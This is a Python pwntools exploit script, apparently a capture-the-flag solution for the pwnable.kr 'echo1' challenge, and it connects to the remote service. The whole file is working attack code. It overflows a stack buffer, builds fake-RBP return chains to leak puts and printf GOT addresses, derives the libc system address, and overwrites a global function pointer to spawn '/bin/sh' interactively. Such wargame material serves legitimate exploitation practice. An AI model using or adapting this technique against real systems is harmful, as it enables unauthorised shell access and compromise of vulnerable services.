from pwn import *
import string

#context.log_level = 'debug'

elf = ELF("./echo1")
libc = ELF("./libc-2.23.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#conn = process("./echo1", env={"LD_PRELOAD":"./libc-2.23.so"})
#conn = process("./echo1", env={"LD_PRELOAD":"/lib/x86_64-linux-gnu/libc.so.6"})
conn = remote("pwnable.kr", 9010)

def BOF_echo(data):
	conn.sendlineafter("> ","1")
	conn.recvline()
	conn.sendline(data)
	conn.recvuntil("goodbye ")
	
def Leak_Addr(got_addr):
	#global main_addr, echo1_get_input, echo1_puts, o_global, greetings, ppr_ebp
	payload  = "A"*32 # s_buf
	payload += p64(o_global+0x20) + p64(echo1_get_input) # fake RBP(wrtie greetings, byebye) + ret1
	payload += p64(got_addr+0x20) + p64(echo1_puts)	# fake RBP(leak puts) + ret2
	payload += "DUMMMMMY" + p64(main_addr) # Dummy + return to main

	o_function  = p64(o_global+8)
	o_function += "A"*24 #name[0], name[1], name[2]
	o_function += p64(greetings)+p64(ppr_ebp) # greetings & byebye overwrite, pop pop ret ebp
	
	BOF_echo(payload)
	conn.sendline(o_function)
	
	conn.recvline() # user name
	conn.recvline() # trash
	leak = conn.recv(6)
	leak = u64(leak + "\x00"*(8-len(leak)))
	conn.recv(1)
	return leak

def Address_Overwrite(target, over_addr, shell="/bin/sh;"):
	payload  = "A"*32 # s_buf
	payload += p64(o_global+0x20) + p64(echo1_get_input) # fake RBP(wrtie greetings, byebye) + ret1
	payload += p64(target+0x20) + p64(echo1_get_input)	# fake RBP(leak puts) + ret2
	payload += "DUMMMMMY" + p64(main_addr) # Dummy + return to main

	o_function  = p64(o_global+8)
	o_function += shell+"A"*(24-len(shell)) #name[0], name[1], name[2]
	o_function += p64(greetings)+p64(ppr_ebp) # greetings & byebye overwrite, pop pop ret ebp
	
	BOF_echo(payload)
	conn.sendline(o_function)
	conn.sendline(p64(over_addr))
	
main_addr = 0x4008B1
echo1_get_input = 0x400837
echo1_puts = 0x400848
o_global = 0x602098
greetings = 0x400794		
	
# call instruction : push eip; jmp addr
# I want fake rbp! but after call instruction. push eip in stack! so pop rbx; 
ppr_ebp = 0x400761 ## pop rbx ; pop rbp ; ret  ;

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
printf_got = elf.got["printf"]
print("")

conn.sendlineafter("name? :", "myria")
conn.recvuntil("- 4. : exit")

## Leak puts_addr & printf_addr
puts_addr = Leak_Addr(puts_got)
conn.sendlineafter("name? :", "myria")
printf_addr = Leak_Addr(printf_got)
conn.sendlineafter("name? :", "myria")

## system_address get!
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']

base_addr = puts_addr - puts_offset
system_addr = base_addr+system_offset

# https://libc.blukat.me/?q=puts%3A5d0%2Cprintf%3A7b0&l=libc6_2.23-0ubuntu3_amd64
log.info("base_addr   : 0x%x" % base_addr)
log.info("puts_addr   : 0x%x" % puts_addr)
log.info("printf_addr : 0x%x" % printf_addr)
log.info("system_addr : 0x%x" % system_addr)

Address_Overwrite(o_global+8+24+8, system_addr, "/bin/sh;");

conn.interactive()

